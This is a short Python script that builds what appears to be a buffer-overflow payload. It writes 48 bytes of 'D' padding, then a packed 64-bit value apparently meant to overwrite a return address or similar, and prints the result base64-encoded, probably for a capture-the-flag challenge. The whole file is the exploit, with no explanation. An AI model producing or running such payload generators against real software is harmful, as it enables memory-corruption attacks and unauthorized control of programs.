
import sys
import struct
import base64

buf = b'DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD'
buf += struct.pack('<Q', 10318280910301147516)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
